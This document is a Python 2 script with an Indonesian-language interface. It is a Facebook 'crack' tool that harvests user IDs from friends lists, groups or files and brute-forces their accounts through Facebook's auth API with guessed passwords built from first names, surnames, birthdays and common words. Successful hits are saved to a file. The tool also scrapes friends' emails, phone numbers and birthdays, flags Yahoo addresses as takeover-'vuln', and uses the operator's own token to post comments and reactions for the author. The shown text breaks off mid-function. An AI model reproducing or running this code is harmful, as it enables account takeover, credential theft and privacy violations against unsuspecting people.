#!/usr/bin/python2
# coding=utf-8

#Import module
import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
from multiprocessing.pool import ThreadPool
try:
	import mechanize
except ImportError:
	os.system("pip2 install mechanize")
try:
	import bs4
except ImportError:
	os.system("pip2 install bs4")
try:
	import requests
except ImportError:
	os.system("pip2 install requests")
	os.system("python2 cek.py")
from requests.exceptions import ConnectionError
from mechanize import Browser 

reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "[!] Exit"
	os.sys.exit()
	
	
def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)
    
    
def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'%s;'%str(31+j))
    x += ''
    x = x.replace('!0','')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.06)
		
#########LOGO#########
logo = """ 
\033[1;31;1m████████ INDONESIAN NEVER SURENDER ✊
\033[37;1m████████ FROM INDONESIAN FOR WORLD ✊
\033[32;1m︻Ω̵̵⃦̵̵͇̿Ω̵͇̿Ω»ــــــــــــــــــــــــــــــــــــــــــ»๏๏
\033[37;1m• Author   : Revi Ahmad Farezi XD.
\033[37;1m• Github   : https://github.com/RVADXD
\033[37;1m• Facebook : https://www.facebook.com/zuck
\033[32;1m︻Ω̵̵⃦̵̵͇̿Ω̵͇̿Ω»ــــــــــــــــــــــــــــــــــــــــــ»๏๏"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m[\033[1;93m●\033[1;97m]\033[1;93m Sedang masuk\033[1;97m "+o),;sys.stdout.flush();time.sleep(1)


back = 0
threads = []
Succes = []
cekpoint = []
oks = []
oke = []
cpe = []
id = []
username = []
idteman = []
idfromteman = []
gagal = []
reaksi = []
komen = []
vulnot = "Not Vuln"
vuln = "Vuln"

######MASUK######
def masuk():
	os.system('clear')
	print logo 
	print "\033[37;1m____________________________________"
	print "\033[37;1m[\033[32;1m01✓\033[37;1m]\033[37;1m Login Facebook With ID Or Email Facebook"
	print "\033[37;1m[\033[32;1m02✓\033[37;1m]\033[37;1m Login With Token Facebook"
	print "\033[37;1m[\033[32;1m00✓\033[37;1m]\033[37;1m Exit"
	print "\033[37;1m____________________________________"
	pilih_masuk()
	
def pilih_masuk():
	msuk = raw_input("\033[37;1m-> \033[91m:\033[1;92m ")
	if msuk =="":
		print"\033[37;1m[\033[32;1m!\033[37;1m] Fill in correctly"
		pilih_masuk()
	elif msuk =="1" or msuk =="01":
		login()
	elif msuk =="2" or msuk =="02":
		token()
	elif msuk =="0" or msuk =="00":
		keluar()
	else:
		print"\033[37;1m[\033[32;1m!\033[37;1m] Fill in correctly"
		pilih_masuk()
		
#####LOGIN_EMAIL#####
def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		print('\033[1;96m[☆] \x1b[1;93mLOGIN AKUN FACEBOOK ANDA \x1b[1;96m[☆]' )
		id = raw_input('\033[1;96m[+] \x1b[1;93mID/Email \x1b[1;91m: \x1b[1;92m')
		pwd = raw_input('\033[1;96m[+] \x1b[1;93mPassword \x1b[1;91m: \x1b[1;92m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n[!] Try again"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\033[1;97m[\033[1;92m✓\033[1;97m]\033[1;92m Login Success'
				os.system('xdg-open https://m.facebook.com/reviahmad.farezi.33')
				bot_komen()
			except requests.exceptions.ConnectionError:
				print"\n[!] Try Again"
				keluar()
		if 'checkpoint' in url:
			print("\n\033[1;97m[\033[1;93m!\033[1;97m]\033[1;93m Your Account Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\033[1;97m[\033[1;91m!\033[1;97m]\033[1;91m Password / Email Wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			masuk() 
			
####LOGIN_TOKEN####
def token():
	os.system('clear')
	print logo
	toket = raw_input("\033[1;97m[\033[1;95m?\033[1;97m] \033[1;93mToken : \033[1;92m")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		print '\033[1;97m[\033[1;92m✓\033[1;97m]\033[1;92m Login Succes'
		os.system('xdg-open https://m.facebook.com/reviahmad.farezi.33')
		bot_komen()
	except KeyError:
		print "\033[1;97m[\033[1;91m!\033[1;97m] \033[1;91mToken Wrong !"
		time.sleep(1.7)
		masuk()
	
######BOT KOMEN#######
def bot_komen():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;97m[!] Token invalid"
		os.system('rm -rf login.txt')
	una = ('100051988012294')
	kom = ('Okeh')
	reac = ('LIKE')
	post = ('142726290803637')
	post2 = ('116951336714466')
	kom2 = ('Awokaowkaowk')
	reac2 = ('LOVE')
	requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ toket)
	requests.post('https://graph.facebook.com/'+post2+'/comments/?message=' +kom2+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac2+ '&access_token='+ toket)
	menu()
			
######MENU######
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		os.system('rm -rf login.txt')
		masuk()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;96m[!] \033[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		masuk()
	except requests.exceptions.ConnectionError:
		print"[!] Try Again"
		keluar()
	os.system("clear")
	print logo
	print 42*"\033[1;96m="
	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m Nama \033[1;91m: \033[1;92m"+nama+"\033[1;97m                  "
	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m ID   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m              "
	print 42*"\033[1;96m="
	print "\x1b[1;97m1.\x1b[1;93m Crack facebook MBF"
	print "\x1b[1;97m2.\x1b[1;93m Look List Group               "
	print "\x1b[1;97m3.\x1b[1;93m Information Account               "
	print "\x1b[1;97m4.\x1b[1;93m Clone Yahoo               "
	print "\x1b[1;97m2.\x1b[1;93m Crack ID Bangladesh/Pakistan             "
	print "\n\x1b[1;91m0.\x1b[1;91m Logout            "
	pilih()

def pilih():
	unikers = raw_input("\n\033[1;97m >>> \033[1;97m")
	if unikers =="":
		print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="2":
		grupsaya()
	elif unikers =="3":
		informasi()
	elif unikers =="4":
		yahoo()
	elif unikers =="5":
		crack()
	elif unikers =="0":
		os.system('clear')
		jalan('Menghapus token')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
		pilih()
		
#####SUPER#####
def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print 42*"\033[1;96m="
	print "\x1b[1;97m1.\x1b[1;93m Crack dari daftar teman"
	print "\x1b[1;97m2.\x1b[1;93m Crack dari teman"
	print "\x1b[1;97m3.\x1b[1;93m Crack dari member grup"
	print "\x1b[1;97m4.\x1b[1;93m Crack dari file"
	print "\n\x1b[1;91m0.\x1b[1;91m Kembali"
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;97m >>> \033[1;97m")
	if peak =="":
		print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		jalan('\033[1;96m[✺] \033[1;93mMengambil ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		idt = raw_input("\033[1;96m[+] \033[1;93mMasukan ID teman \033[1;91m: \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mNama teman\033[1;91m :\033[1;97m "+op["name"]
		except KeyError:
			print"\033[1;96m[!] \x1b[1;91mTeman tidak ditemukan!"
			raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
			super()
		jalan('\033[1;96m[✺] \033[1;93mMengambil ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="3":
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		idg=raw_input('\033[1;96m[+] \033[1;93mMasukan ID group \033[1;91m:\033[1;97m ')
		try:
			r=requests.get('https://graph.facebook.com/group/?id='+idg+'&access_token='+toket)
			asw=json.loads(r.text)
			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mNama group \033[1;91m:\033[1;97m "+asw['name']
		except KeyError:
			print"\033[1;96m[!] \x1b[1;91mGroup tidak ditemukan"
			raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
			super()
		jalan('\033[1;96m[✺] \033[1;93mMengambil ID \033[1;97m...')
		re=requests.get('https://graph.facebook.com/'+idg+'/members?fields=name,id&limit=999999999&access_token='+toket)
		s=json.loads(re.text)
		for p in s['data']:
			id.append(p['id'])
	elif peak =="4":
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		try:
			idlist = raw_input('\x1b[1;96m[+] \x1b[1;93mMasukan nama file  \x1b[1;91m: \x1b[1;97m')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except IOError:
			print '\x1b[1;96m[!] \x1b[1;91mFile tidak ditemukan'
			raw_input('\n\x1b[1;96m[ \x1b[1;97mKembali \x1b[1;96m]')
			super()
	elif peak =="0":
		menu()
	else:
		print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
		pilih_super()
	
	print "\033[1;96m[+] \033[1;93mTotal ID \033[1;91m: \033[1;97m"+str(len(id))
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;96m[\033[1;97m✸\033[1;96m] \033[1;93mCrack \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
	print
	print('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
	print 42*"\033[1;96m="
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name']+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
				print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
				print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
				print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass1 + '\n'
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
					print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
					print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
					print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass1 + '\n'
					cek = open("out/super_cp.txt", "a")
					cek.write("ID:" +user+ " Pw:" +pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name']+'12345'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
						print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
						print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
						print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass2 + '\n'
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
							print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
							print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
							print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass2 + '\n'
							cek = open("out/super_cp.txt", "a")
							cek.write("ID:" +user+ " Pw:" +pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['last_name'] + '123'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass3 + '\n'
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
									print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
									print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
									print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass3 + '\n'
									cek = open("out/super_cp.txt", "a")
									cek.write("ID:" +user+ " Pw:" +pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = 'Bangsat'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
										print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
										print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
										print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass4 + '\n'
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
											print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
											print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
											print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass4 + '\n'
											cek = open("out/super_cp.txt", "a")
											cek.write("ID:" +user+ " Pw:" +pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											birthday = b['birthday']
											pass5 = birthday.replace('/', '')
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
												print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
												print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
												print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass5 + '\n'
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
													print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
													print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
													print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass5 + '\n'
													cek = open("out/super_cp.txt", "a")
													cek.write("ID:" +user+ " Pw:" +pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = 'Sayang'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
														print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
														print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
														print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass6 + '\n'
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
															print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
															print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
															print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass6 + '\n'
															cek = open("out/super_cp.txt", "a")
															cek.write("ID:" +user+ " Pw:" +pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mSelesai \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;96m[+] \033[1;92mCP File tersimpan \033[1;91m: \033[1;97mout/super_cp.txt")
	raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
	os.system("python2 cek.py")

####GRUPSAYA####
def grupsaya():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('clear')
	print logo
	print 42*"\033[1;96m="
	try:
		uh = requests.get('https://graph.facebook.com/me/groups?access_token='+toket)
		gud = json.loads(uh.text)
		for p in gud['data']:
			nama = p["name"]
			id = p["id"]
			f=open('out/Grupid.txt','w')
			listgrup.append(id)
			f.write(id + '\n')
			print("\033[1;96m[✓] \033[1;92mGROUP SAYA")
			print("\033[1;96m[➹] \033[1;97mID  \033[1;91m: \033[1;92m"+str(id))
			print("\033[1;96m[➹] \033[1;97mNama\033[1;91m: \033[1;92m"+str(nama) + '\n')
		print 42*"\033[1;96m="
		print"\033[1;96m[+] \033[1;92mTotal Group \033[1;91m:\033[1;97m %s"%(len(listgrup))
		print("\033[1;96m[+] \033[1;92mTersimpan \033[1;91m: \033[1;97mout/Grupid.txt")
		f.close()
		raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
		menu()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;96m[!] \x1b[1;91mTerhenti")
		raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
		menu()
	except KeyError:
		os.remove('out/Grupid.txt')
		print('\033[1;96m[!] \x1b[1;91mGroup tidak ditemukan')
		raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
		menu()
	except requests.exceptions.ConnectionError:
		print"\033[1;96m[✖] \x1b[1;91mTidak ada koneksi"
		keluar()
	except IOError:
		print "\033[1;96m[!] \x1b[1;91mError"
		raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
		informasi ()

####INFORMASI####
def informasi():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print 42*"\033[1;96m="
	aid = raw_input('\033[1;96m[+] \033[1;93mMasukan ID/Nama\033[1;91m : \033[1;97m')
	jalan('\033[1;96m[✺] \033[1;93mTunggu sebentar \033[1;97m...')
	r = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
	cok = json.loads(r.text)
	for i in cok['data']:
		if aid in i['name'] or aid in i['id']:
			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
			z = json.loads(x.text)
			print 43*"\033[1;96m="
			try:
				print '\033[1;96m[➹] \033[1;93mNama\033[1;97m          : '+z['name']
			except KeyError: print '\033[1;96m[?] \033[1;93mNama\033[1;97m          : \033[1;91mTidak ada'
			try:
				print '\033[1;96m[➹] \033[1;93mID\033[1;97m            : '+z['id']
			except KeyError: print '\033[1;96m[?] \033[1;93mID\033[1;97m            : \033[1;91mTidak ada'
			try:
				print '\033[1;96m[➹] \033[1;93mEmail\033[1;97m         : '+z['email']
			except KeyError: print '\033[1;96m[?] \033[1;93mEmail\033[1;97m         : \033[1;91mTidak ada'
			try:
				print '\033[1;96m[➹] \033[1;93mNo HP\033[1;97m         : '+z['mobile_phone']
			except KeyError: print '\033[1;96m[?] \033[1;93mNo HP\033[1;97m         : \033[1;91mTidak ada'
			try:
				print '\033[1;96m[➹] \033[1;93mTempat tinggal\033[1;97m: '+z['location']['name']
			except KeyError: print '\033[1;96m[?] \033[1;93mTempat tinggal\033[1;97m: \033[1;91mTidak ada'
			try:
				print '\033[1;96m[➹] \033[1;93mTanggal lahir\033[1;97m : '+z['birthday']
			except KeyError: print '\033[1;96m[?] \033[1;93mTanggal lahir\033[1;97m : \033[1;91mTidak ada'
			try:
				print '\033[1;96m[➹] \033[1;93mSekolah\033[1;97m       : '
				for q in z['education']:
					try:
						print '\033[1;91m                   ~ \033[1;97m'+q['school']['name']
					except KeyError: print '\033[1;91m                   ~ \033[1;91mTidak ada'
			except KeyError: pass
			raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
			menu()
		else:
			pass
	else:
		print"\033[1;96m[✖] \x1b[1;91mAkun tidak ditemukan"
		raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
		menu()

####YAHOO####
def yahoo():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print 42*"\033[1;96m="
	print "\x1b[1;97m1.\x1b[1;93m Clone dari daftar teman"
	print "\x1b[1;97m2.\x1b[1;93m Clone dari teman"
	print "\x1b[1;97m3.\x1b[1;93m Clone dari member group"
	print "\x1b[1;97m4.\x1b[1;93m Clone dari file"
	print "\n\x1b[1;91m0.\x1b[1;91m Kembali"
	clone()
       
def clone():
	embuh = raw_input("\n\x1b[1;97m >>> ")
	if embuh =="":
		print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
	elif embuh =="1":
		clone_dari_daftar_teman()
	elif embuh =="2":
		clone_dari_teman()
	elif embuh =="3":
		clone_dari_member_group()
	elif embuh =="4":
		clone_dari_file()
	elif embuh =="0":
		menu()
	else:
		print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
		

def clone_dari_daftar_teman():
	global toket
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token Invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('clear')
	print logo
	mpsh = []
	jml = 0
	print 42*"\033[1;96m="
	jalan('\033[1;96m[\x1b[1;97m✺\x1b[1;96m] \033[1;93mMengambil email \033[1;97m...')
	teman = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
	kimak = json.loads(teman.text)
	jalan('\033[1;96m[\x1b[1;97m✺\x1b[1;96m] \033[1;93mStart \033[1;97m...')
	print ('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
	print 42*"\033[1;96m="
	for w in kimak['data']:
		jml +=1
		mpsh.append(jml)
		id = w['id']
		nama = w['name']
		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
		z = json.loads(links.text)
		try:
			mail = z['email']
			yahoo = re.compile(r'@.*')
			otw = yahoo.search(mail).group()
			if 'yahoo.com' in otw:
				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				br._factory.is_html = True
				br.select_form(nr=0)
				br["username"] = mail
				klik = br.submit().read()
				jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
				try:
					pek = jok.search(klik).group()
				except:
					continue
				if '"messages.ERROR_INVALID_USERNAME">' in pek:
					print("\033[1;96m[✓] \033[1;92mVULN")
					print("\033[1;96m[➹] \033[1;97mID   \033[1;91m: \033[1;92m"+id)
					print("\033[1;96m[➹] \033[1;97mEmail\033[1;91m: \033[1;92m"+mail)
					print("\033[1;96m[➹] \033[1;97mNama \033[1;91m: \033[1;92m"+nama+ '\n')
					save = open('out/MailVuln.txt','a')
					save.write("Nama : "+ nama + '\n' "ID        : "+ id + '\n' "Email  : "+ mail + '\n\n')
					save.close()
					berhasil.append(mail)
		except KeyError:
			pass
	print 42*"\033[1;96m="
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mSelesai \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
	print"\033[1;96m[+] \033[1;92mFile tersimpan \033[1;91m:\033[1;97m out/MailVuln.txt"
	raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
	menu()
		

def clone_dari_teman():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('clear')
	print logo
	mpsh = []
	jml = 0
	print 42*"\033[1;96m="
	idt = raw_input("\033[1;96m[+] \033[1;93mMasukan ID teman \033[1;91m: \033[1;97m")
	try:
		jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
		op = json.loads(jok.text)
